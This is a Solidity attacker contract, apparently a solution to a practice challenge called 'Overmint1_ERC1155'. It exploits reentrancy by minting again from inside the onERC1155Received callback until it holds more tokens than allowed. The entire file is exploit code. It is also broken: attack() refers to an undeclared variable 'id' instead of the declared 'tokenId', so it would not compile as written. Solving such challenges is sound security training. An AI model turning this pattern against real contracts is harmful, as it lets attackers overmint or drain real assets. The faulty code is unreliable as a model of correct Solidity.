// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1_ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    Overmint1_ERC1155 public target;
    uint256 public reentrancyCount;
    uint256 public tokenId = 1;
    bytes public data = "";

    constructor(address _target) {
        target = Overmint1_ERC1155(_target);
    }

    function attack() external {
        reentrancyCount = 0;
        target.mint(id, data);
    }

    /// test 2

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes calldata data
    ) public override returns (bytes4) {
        // Reenter the mint function only if we haven't minted 5 yet
        if (reentrancyCount < 5) {
            reentrancyCount++;
            target.mint(id, data); // Reenter the mint function
        }
        return this.onERC1155Received.selector;
    }
}
